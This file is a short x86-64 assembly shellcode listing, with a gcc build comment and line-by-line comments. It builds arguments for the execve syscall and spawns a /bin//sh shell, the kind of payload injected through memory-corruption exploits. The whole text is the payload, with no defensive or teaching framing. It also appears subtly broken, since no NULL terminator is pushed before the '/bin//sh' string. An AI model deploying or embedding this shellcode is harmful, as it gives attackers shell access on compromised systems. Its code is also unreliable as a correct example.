; gcc -nostdlib -o shellcode shellcode.s -masm=intel

.intel_syntax noprefix
.global _start
_start:
    xor rdx, rdx                # rdx = 0 (envp = NULL)

    mov rax, 0x68732f6e69622f2f # "/bin//sh" (temporary into rax)
    push rax                    # push "/bin//sh" on stack
    mov rdi, rsp                # rdi -> "/bin//sh"

    push rdx                    # push NULL terminator for argv
    push rdi                    # push pointer to "/bin//sh"
    mov rsi, rsp                # rsi -> argv (pointer to [rdi, NULL])

    xor rax, rax                # clear rax
    mov al, 59                  # syscall number 59 (execve)
    syscall

